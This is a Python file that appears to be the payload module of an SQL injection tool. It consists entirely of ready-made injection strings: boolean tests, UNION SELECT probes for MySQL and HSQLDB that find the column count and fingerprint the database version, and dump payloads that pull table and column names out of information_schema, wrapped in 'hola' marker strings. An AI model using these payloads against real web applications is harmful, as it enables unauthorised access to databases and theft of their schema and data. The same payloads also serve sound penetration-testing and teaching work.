injections = {
    # Boolean
    "numeric": ["1 OR 1=1", "1 OR 1=2"],
    "string": ["' OR '1'='1", "' OR '1'='2"],
    # Union
    "mysql_num": ["1 UNION SELECT @@version; -- ",
        "1 UNION SELECT NULL,@@version; -- ",
        "1 UNION SELECT NULL,NULL,@@version; -- ",
        "1 UNION SELECT NULL,NULL,NULL,@@version; -- ",
        "1 UNION SELECT NULL,NULL,NULL,NULL,@@version; -- ",
        "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,@@version; -- ",
        "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,@@version; -- ",
        "1 UNION SELECT NULL,NULL,NULL,1",
    ],
    "mysql_str": ["1' UNION SELECT @@version; -- ",
        "1' UNION SELECT NULL,@@version; -- ",
        "1' UNION SELECT NULL,NULL,@@version; -- ",
        "1' UNION SELECT NULL,NULL,NULL,@@version; -- ",
        "1' UNION SELECT NULL,NULL,NULL,NULL,@@version; -- ",
        "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,@@version; -- ",
        "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,@@version; -- "
    ],
    "hsqldb_num": [
        "1 union select character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1 union select null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1 union select character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1 union select null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1 union select null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1 union select character_value,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1 union select null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1 union select null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1 union select null,character_value,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1 union select character_value,null,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1 union select null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1 union select null,null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1 union select null,null,null,null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
    ],
    "hsqldb_str": [
        "1' union select character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1' union select null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1' union select character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1' union select null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1' union select null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1' union select character_value,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1' union select null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1' union select null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1' union select null,character_value,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1' union select character_value,null,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1' union select null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1' union select null,null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1' union select null,null,null,null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
        "1' union select null,null,null,null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
    ],
}

inject_dump = {
    # Dump -------
    "sql_version": "' UNION SELECT NULL, CONCAT('hola',@@version,'hola'); -- ",
    "sql_tables": "' UNION SELECT NULL, CONCAT('hola',table_catalog,'holi',table_name,'hola') FROM information_schema.tables; -- ",
    "sql_columns": "' UNION SELECT NULL, CONCAT('hola',table_name,'holi',column_name,'hola') FROM information_schema.columns; -- ",

    "hsqldb_version": "' union select null,null,null,null,null,'hola'||character_value||'hola' from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
    "hsqldb_tables": "' union select null,null,null,null,null,'hola'||table_catalog||'holi'||table_name||'hola' from information_schema.tables; -- ",
    "hsqldb_columns": "' union select null,null,null,null,null,'hola'||table_name||'holi'||column_name||'hola' from information_schema.columns; -- ",

    "hsqldb_n_version": "1 union select null,null,null,null,null,'hola'||character_value||'hola',null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
    "hsqldb_n_tables": "1 union select null,null,null,null,null,'hola'||table_catalog||'holi'||table_name||'hola',null from information_schema.tables; -- ",
    "hsqldb_n_columns": "1 union select null,null,null,null,null,'hola'||table_name||'holi'||column_name||'hola',null from information_schema.columns; -- ",
}
